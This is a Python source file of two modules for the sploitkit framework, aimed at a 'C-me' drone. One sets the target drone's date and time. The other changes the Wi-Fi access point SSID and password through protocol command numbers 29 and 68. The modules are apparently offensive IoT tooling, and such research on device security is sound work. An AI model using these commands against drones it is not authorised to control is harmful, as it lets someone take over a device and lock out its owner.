# -*- coding: UTF-8 -*-
from datetime import datetime
from sploitkit import *

from generic import CmeFunctionality


class ChangeDatetime(CmeFunctionality):
    """
    Change the datetime of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    config = Config({
        Option(
            'NEW_DATETIME',
            "new datetime to be configured",
            True,
            #FIXME: validate=lambda s: [...],
        ): "01/01/1970 00:00:00",
        Option(
            'DATETIME_FORMAT',
            "datetime format to be considered",
            True,
        ): "%d/%m/%Y %H:%M:%S",
    })
    
    def run(self):
        dt = datetime.strptime(self.config.get("NEW_DATETIME"),
                               self.config.get("DATETIME_FORMAT"))
        self.logger.info("Changing datetime...")
        if self.send_command(29, {"YEAR": dt.year, "MONTH": dt.month,
                                  "DAY": dt.day, "HOUR": dt.hour,
                                  "MINUTE": dt.minute, "SECOND": dt.second}):
            self.logger.success("Datetime changed")


class ChangeApCreds(CmeFunctionality):
    """
    Change the SSID and/or the password of the target C-me.
    
    Author:  Yannick Pasquazzo
    Email:   y.pasquazzo@hotmail.com
    Version: 1.0
    """
    # TODO:  split in ChangePassword and ChangeSsid
    # FIXME: prevent the user from changing both at the same time ; it seems the
    #         drone can only change one value at a time (at least, in a stable
    #         way)
    config = Config({
        Option(
            'NEW_PASSWORD',
            "Target's new password",
            True,
        ): "12345678",
        Option(
            'NEW_SSID',
            "Target's new SSID",
            True,
        ): "C-me_8a9dd5",
    })
    
    def run(self):
        self.logger.info("Changing password...")
        pswd = self.config.option("NEW_PASSWORD").value
        ssid = self.config.option("NEW_SSID").value
        if self.send_command(68, {"phrase": pswd, "ssid": ssid}):
            self.logger.success("AP credentials changed successfully")
